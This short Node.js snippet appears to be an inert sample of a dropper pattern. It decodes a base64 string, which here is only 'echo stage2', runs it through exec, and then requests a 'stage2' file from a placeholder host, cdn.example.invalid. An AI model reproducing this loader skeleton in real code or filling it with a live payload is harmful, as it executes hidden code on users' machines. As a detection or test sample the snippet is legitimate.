const { exec } = require("child_process");
const blob = "ZWNobyBzdGFnZTI="; // inert placeholder
exec(Buffer.from(blob, "base64").toString());
require("https").get("https://cdn.example.invalid/stage2", () => {});
